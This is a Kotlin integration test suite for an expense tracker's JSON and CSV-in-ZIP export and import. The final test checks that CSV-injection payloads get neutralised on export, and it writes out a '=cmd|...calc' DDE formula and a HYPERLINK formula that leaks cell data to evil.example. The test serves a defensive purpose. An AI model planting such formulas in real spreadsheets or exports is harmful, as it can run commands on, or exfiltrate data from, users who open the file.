package com.vshpynta.expenses.api.service

import com.vshpynta.expenses.api.config.TestContainersConfig
import com.vshpynta.expenses.api.config.TestSecurityConfig
import com.vshpynta.expenses.api.repository.CategoryRepository
import com.vshpynta.expenses.api.repository.ExpenseProjectionRepository
import com.vshpynta.expenses.api.service.auth.UserContextService
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.reactor.awaitSingle
import kotlinx.coroutines.runBlocking
import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.mockito.kotlin.doReturn
import org.mockito.kotlin.whenever
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.boot.test.context.SpringBootTest
import org.springframework.context.annotation.Import
import org.springframework.r2dbc.core.DatabaseClient
import org.springframework.test.context.ActiveProfiles
import org.springframework.test.context.bean.override.mockito.MockitoBean
import java.io.ByteArrayInputStream
import java.util.zip.ZipInputStream

/**
 * Integration tests for [DataExchangeService]. Verifies the full
 * round-trip (export → import) for both JSON and CSV-in-ZIP formats and
 * checks that the standard command path is used (events get appended,
 * projections get materialised).
 */
@SpringBootTest
@ActiveProfiles("test")
@Import(TestContainersConfig::class, TestSecurityConfig::class)
class DataExchangeServiceTest {

    companion object {
        private const val TEST_USER_ID = TestSecurityConfig.TEST_USER_ID
    }

    @Autowired
    private lateinit var dataExchangeService: DataExchangeService

    @Autowired
    private lateinit var dataExporter: DataExporter

    @Autowired
    private lateinit var categoryService: CategoryService

    @Autowired
    private lateinit var commandService: ExpenseCommandService

    @Autowired
    private lateinit var categoryRepository: CategoryRepository

    @Autowired
    private lateinit var projectionRepository: ExpenseProjectionRepository

    @Autowired
    private lateinit var databaseClient: DatabaseClient

    @MockitoBean
    private lateinit var userContextService: UserContextService

    @BeforeEach
    fun setup() {
        runBlocking {
            databaseClient.sql("DELETE FROM processed_events").fetch().rowsUpdated().awaitSingle()
            databaseClient.sql("DELETE FROM expense_events").fetch().rowsUpdated().awaitSingle()
            databaseClient.sql("DELETE FROM expense_projections").fetch().rowsUpdated().awaitSingle()
            databaseClient.sql("DELETE FROM categories WHERE user_id = '$TEST_USER_ID'")
                .fetch().rowsUpdated().awaitSingle()
            whenever(userContextService.currentUserId()) doReturn TEST_USER_ID
        }
    }

    @Test
    fun `should export current categories and active expenses as JSON`(): Unit = runBlocking {
        // Given: A user with one custom category and two expenses
        val travel = categoryService.createCategory(
            name = "Travel", icon = "Flight", color = "#5b8def", sortOrder = 1,
        )
        commandService.createExpense(
            description = "Hotel", amount = 12_000, currency = "USD",
            categoryId = travel.categoryId, date = "2026-04-30",
        )
        commandService.createExpense(
            description = "Taxi", amount = 2_500, currency = "USD",
            categoryId = travel.categoryId, date = "2026-04-29",
        )

        // When: Asking the exporter for the structured snapshot. The
        // facade's `exportAsJson()` returns HTTP-ready bytes; tests
        // that need to assert on the in-memory shape depend on
        // [DataExporter] directly — that's the correct seam.
        val snapshot = dataExporter.exportSnapshot()

        // Then
        assertThat(snapshot.version).isEqualTo(1)
        assertThat(snapshot.exportedAt).isNotBlank()
        // Default templated categories are seeded on first access; "Travel"
        // is the only custom row, but the export includes everything active.
        assertThat(snapshot.categories.map { it.name }).contains("Travel")
        assertThat(snapshot.expenses).hasSize(2)
        assertThat(snapshot.expenses.map { it.description })
            .containsExactlyInAnyOrder("Hotel", "Taxi")
        assertThat(snapshot.expenses.map { it.amountMinor })
            .containsExactlyInAnyOrder(12_000L, 2_500L)
        assertThat(snapshot.expenses).allMatch { it.category == "Travel" }
    }

    @Test
    fun `should round-trip JSON export through import without losing data`(): Unit = runBlocking {
        // Given: A populated dataset
        val travel = categoryService.createCategory(
            name = "Travel", icon = "Flight", color = "#5b8def", sortOrder = 1,
        )
        commandService.createExpense(
            description = "Hotel", amount = 12_000, currency = "USD",
            categoryId = travel.categoryId, date = "2026-04-30",
        )

        val exportedJson = dataExchangeService.exportAsJson()

        // When: Wiping the user's data and importing the same export
        databaseClient.sql("DELETE FROM expense_events").fetch().rowsUpdated().awaitSingle()
        databaseClient.sql("DELETE FROM expense_projections").fetch().rowsUpdated().awaitSingle()
        databaseClient.sql("DELETE FROM categories WHERE user_id = '$TEST_USER_ID'")
            .fetch().rowsUpdated().awaitSingle()

        val result = dataExchangeService.importJson(exportedJson)

        // Then
        assertThat(result.errors).isEmpty()
        assertThat(result.expensesCreated).isEqualTo(1)
        // Custom "Travel" gets created; templated rows are re-seeded by
        // first-access lookup, so they don't count as "imports".
        assertThat(result.categoriesCreated).isGreaterThanOrEqualTo(1)

        val expenses = projectionRepository.findAllActiveByUserId(TEST_USER_ID).toList()
        assertThat(expenses).hasSize(1)
        assertThat(expenses.single().description).isEqualTo("Hotel")
        assertThat(expenses.single().amount).isEqualTo(12_000L)

        val categories = categoryRepository.findAllByUserId(TEST_USER_ID).toList()
            .filter { !it.deleted }
        assertThat(categories.map { it.name }).contains("Travel")
    }

    @Test
    fun `should reuse existing categories on import instead of duplicating them`(): Unit = runBlocking {
        // Given: An existing "Travel" category with a recorded expense
        val travel = categoryService.createCategory(
            name = "Travel", icon = "Flight", color = "#5b8def",
        )
        commandService.createExpense(
            description = "Hotel", amount = 12_000, currency = "USD",
            categoryId = travel.categoryId, date = "2026-04-30",
        )
        val exportedBytes = dataExchangeService.exportAsJson()

        // When: Importing the same export again — should be idempotent for categories
        val result = dataExchangeService.importJson(exportedBytes)

        // Then: Travel is reused, only the expense is duplicated
        assertThat(result.categoriesCreated).isZero()
        assertThat(result.expensesCreated).isEqualTo(1)
        val travelRows = categoryRepository.findAllByUserId(TEST_USER_ID).toList()
            .filter { !it.deleted && it.name == "Travel" }
        assertThat(travelRows).hasSize(1)

        val expenses = projectionRepository.findAllActiveByUserId(TEST_USER_ID).toList()
        assertThat(expenses).hasSize(2)
    }

    @Test
    fun `should export CSV as ZIP containing categories and expenses files`(): Unit = runBlocking {
        // Given
        val travel = categoryService.createCategory(
            name = "Travel", icon = "Flight", color = "#5b8def",
        )
        commandService.createExpense(
            description = "Hotel", amount = 12_000, currency = "USD",
            categoryId = travel.categoryId, date = "2026-04-30",
        )

        // When
        val zipBytes = dataExchangeService.exportAsCsvZip()
        val entries = readZip(zipBytes)

        // Then
        assertThat(entries.keys).containsExactlyInAnyOrder("categories.csv", "expenses.csv")
        val expensesCsv = entries.getValue("expenses.csv")
        assertThat(expensesCsv).contains("Hotel,12000,USD,Travel")
        // Hex colors begin with `#` (low-ASCII) so Jackson CSV's lenient
        // quoting wraps them; valid CSV either way.
        assertThat(entries.getValue("categories.csv")).contains("Travel,Flight,\"#5b8def\"")
    }

    @Test
    fun `should round-trip CSV-in-ZIP export through import`(): Unit = runBlocking {
        // Given
        val travel = categoryService.createCategory(
            name = "Travel", icon = "Flight", color = "#5b8def",
        )
        commandService.createExpense(
            description = "Hotel", amount = 12_000, currency = "USD",
            categoryId = travel.categoryId, date = "2026-04-30",
        )
        val zipBytes = dataExchangeService.exportAsCsvZip()

        // When: Wiping and importing
        databaseClient.sql("DELETE FROM expense_events").fetch().rowsUpdated().awaitSingle()
        databaseClient.sql("DELETE FROM expense_projections").fetch().rowsUpdated().awaitSingle()
        databaseClient.sql("DELETE FROM categories WHERE user_id = '$TEST_USER_ID'")
            .fetch().rowsUpdated().awaitSingle()

        val result = dataExchangeService.importCsvZip(zipBytes)

        // Then
        assertThat(result.errors).isEmpty()
        assertThat(result.expensesCreated).isEqualTo(1)
        val expenses = projectionRepository.findAllActiveByUserId(TEST_USER_ID).toList()
        assertThat(expenses.single().description).isEqualTo("Hotel")
        assertThat(expenses.single().amount).isEqualTo(12_000L)
    }

    @Test
    fun `should auto-create a category when an imported expense references an unknown label`(): Unit = runBlocking {
        // Given: Just an expenses CSV with a brand-new category name
        val expensesCsv = """
            date,description,amountMinor,currency,category
            2026-04-30,Souvenir,500,USD,Random Category
        """.trimIndent()

        // When
        val result = dataExchangeService.importExpensesCsv(expensesCsv.toByteArray(Charsets.UTF_8))

        // Then: New category was created so the expense isn't orphaned
        assertThat(result.expensesCreated).isEqualTo(1)
        assertThat(result.errors).isEmpty()
        assertThat(result.fatal).isNull()
        // Resolver auto-creations are folded into the categories total
        // so the summary matches what the DB now contains.
        assertThat(result.categoriesCreated).isEqualTo(1)
        val categories = categoryRepository.findAllByUserId(TEST_USER_ID).toList()
            .filter { !it.deleted }
        assertThat(categories.map { it.name }).contains("Random Category")
    }

    @Test
    fun `should import CSV-in-ZIP when files are nested inside a folder`(): Unit = runBlocking {
        // Given: A zip whose CSVs live one level deep — this is what
        // Windows Explorer / macOS Finder produce when the user extracts
        // the export and re-zips the resulting folder.
        val categoriesCsv = "name,icon,color,sortOrder,templateKey\r\nTravel,Flight,#5b8def,1,\r\n"
        val expensesCsv =
            "date,description,amountMinor,currency,category\r\n" +
                "2026-04-30,Hotel,12000,USD,Travel\r\n"
        val zipBytes = buildZip(
            mapOf(
                "expenses-tracker-export-2026-04-30/categories.csv" to categoriesCsv,
                "expenses-tracker-export-2026-04-30/expenses.csv" to expensesCsv,
            )
        )

        // When
        val result = dataExchangeService.importCsvZip(zipBytes)

        // Then: Files are matched by basename so the nested layout works
        assertThat(result.errors).isEmpty()
        assertThat(result.expensesCreated).isEqualTo(1)
        assertThat(result.categoriesCreated).isEqualTo(1)
        val expenses = projectionRepository.findAllActiveByUserId(TEST_USER_ID).toList()
        assertThat(expenses.single().description).isEqualTo("Hotel")
    }

    @Test
    fun `should report parse error and skip rows when JSON is malformed`(): Unit = runBlocking {
        // When
        val result = dataExchangeService.importJson(
            "{\"version\": 1, \"expenses\": [".toByteArray(Charsets.UTF_8)
        )

        // Then: malformed payload → fatal channel, never row-level errors
        assertThat(result.expensesCreated).isZero()
        assertThat(result.categoriesCreated).isZero()
        assertThat(result.errors).isEmpty()
        assertThat(result.fatal).isNotNull().contains("Malformed JSON")
    }

    @Test
    fun `should neutralise CSV-injection payloads in exported expense and category cells`(): Unit = runBlocking {
        // Given: An attacker-controlled description and category name —
        // the kind of payload one user could plant via the public API
        // and another user could trip over by opening the export in
        // Excel / Sheets.
        val evil = categoryService.createCategory(
            name = "=cmd|'/c calc'!A0", icon = "Category", color = "#ff0000",
        )
        commandService.createExpense(
            description = "=HYPERLINK(\"http://evil.example/?leak=\"&A1, \"Click\")",
            amount = 100, currency = "USD",
            categoryId = evil.categoryId, date = "2026-04-30",
        )

        // When
        val zipBytes = dataExchangeService.exportAsCsvZip()
        val entries = readZip(zipBytes)

        // Then: every dangerous prefix is neutralised by a leading
        // apostrophe, so opening the file in a spreadsheet renders the
        // cell as text instead of executing it. (OWASP CSV-injection
        // mitigation, CVE-2014-3524 family.)
        val expensesCsv = entries.getValue("expenses.csv")
        val categoriesCsv = entries.getValue("categories.csv")
        assertThat(expensesCsv).contains("\"'=HYPERLINK")
        assertThat(categoriesCsv).contains("\"'=cmd|'/c calc'!A0\"")
        // And no raw payload survives unescaped at the start of any cell.
        assertThat(expensesCsv).doesNotContain(",=HYPERLINK")
        assertThat(categoriesCsv).doesNotContain(",=cmd")
    }

    private fun readZip(bytes: ByteArray): Map<String, String> {
        val out = HashMap<String, String>()
        ZipInputStream(ByteArrayInputStream(bytes)).use { zip ->
            var entry = zip.nextEntry
            while (entry != null) {
                out[entry.name] = zip.readAllBytes().toString(Charsets.UTF_8)
                zip.closeEntry()
                entry = zip.nextEntry
            }
        }
        return out
    }

    private fun buildZip(entries: Map<String, String>): ByteArray =
        java.io.ByteArrayOutputStream().use { baos ->
            java.util.zip.ZipOutputStream(baos).use { zip ->
                entries.forEach { (name, content) ->
                    zip.putNextEntry(java.util.zip.ZipEntry(name))
                    zip.write(content.toByteArray(Charsets.UTF_8))
                    zip.closeEntry()
                }
            }
            baos.toByteArray()
        }
}
